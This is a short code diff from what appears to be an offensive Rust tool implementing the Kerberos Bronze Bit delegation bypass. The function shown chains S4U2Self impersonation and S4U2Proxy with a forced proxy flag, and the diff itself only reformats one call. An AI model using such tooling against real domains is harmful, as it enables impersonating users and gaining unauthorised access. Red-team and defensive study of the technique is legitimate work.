@@ -54,12 +54,7 @@ pub async fn run_bronze_bit(config: &ForgeConfig, target_spn: &str) -> Result<Fo
 
     // Step 2: S4U2Self for the impersonate user
     info!("[bronzebit] Step 2: S4U2Self as {impersonate}");
-    let s4u2_self = kerberos::s4u2self(
-        &config.dc_ip,
-        &user_tgt,
-        impersonate,
-    )
-    .await?;
+    let s4u2_self = kerberos::s4u2self(&config.dc_ip, &user_tgt, impersonate).await?;
 
     // Step 3: S4U2Proxy with Bronze Bit bypass (PA-PAC-OPTIONS with proxy flag)
     info!("[bronzebit] Step 3: S4U2Proxy with PA-PAC-OPTIONS (Bronze Bit)");
